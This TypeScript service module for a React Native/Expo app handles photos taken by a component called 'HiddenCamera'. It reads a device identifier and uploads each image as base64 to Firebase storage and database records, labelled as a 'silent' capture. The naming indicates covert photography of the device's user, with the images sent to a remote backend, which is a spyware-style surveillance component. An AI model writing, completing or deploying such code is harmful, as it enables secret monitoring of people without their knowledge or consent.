import { Camera } from 'expo-camera';
import { ref as storageRef, uploadString, getDownloadURL } from 'firebase/storage';
import { ref as dbRef, set, push } from 'firebase/database';
import { storage, database } from '@/services/firebase';
import * as Device from 'expo-device';
import * as Application from 'expo-application';
import { Platform } from 'react-native';

class CameraServiceClass {
  private captureCallback: ((base64: string) => void) | null = null;

  async requestPermissions(): Promise<boolean> {
    try {
      const { status } = await Camera.requestCameraPermissionsAsync();
      if (status !== 'granted') {
        console.log('Camera permission denied');
        return false;
      }
      console.log('Camera permission granted');
      return true;
    } catch (error) {
      console.error('Error requesting camera permission:', error);
      return false;
    }
  }

  async getDeviceId(): Promise<string> {
    if (Platform.OS === 'web') {
      return 'web_' + navigator.userAgent.slice(0, 50).replace(/[^a-zA-Z0-9]/g, '');
    }
    return Application.androidId || Device.modelId || 'unknown';
  }

  // Set callback for when photo is captured by HiddenCamera component
  setCaptureCallback(callback: (base64: string) => void) {
    this.captureCallback = callback;
  }

  // Called by HiddenCamera component when photo is captured
  async onPhotoCaptured(base64: string) {
    const deviceId = await this.getDeviceId();
    const timestamp = Date.now();
    await this.uploadPhotoToFirebase(deviceId, base64, timestamp);
  }

  async uploadPhotoToFirebase(deviceId: string, base64: string, timestamp: number): Promise<void> {
    try {
      const photoPath = `photos/${deviceId}/${timestamp}.jpg`;
      const photoStorageRef = storageRef(storage, photoPath);

      await uploadString(photoStorageRef, base64, 'base64');

      const downloadURL = await getDownloadURL(photoStorageRef);

      const photoMetadataRef = push(dbRef(database, `photos/${deviceId}`));
      await set(photoMetadataRef, {
        downloadURL,
        base64,
        timestamp,
        deviceId,
        captureType: 'silent',
      });

      console.log('✅ Photo uploaded to Firebase:', photoPath);
    } catch (error) {
      console.error('Error uploading photo to Firebase:', error);
    }
  }

  async captureAndUpload(deviceId?: string): Promise<void> {
    try {
      const deviceIdToUse = deviceId || (await this.getDeviceId());
      
      // Trigger the capture via callback
      console.log('📸 Camera capture requested...');
      
      // Note: Actual capture happens in HiddenCamera component
      // The component will call onPhotoCaptured when ready
    } catch (error) {
      console.error('Error in capture and upload:', error);
    }
  }
}

export const CameraService = new CameraServiceClass();
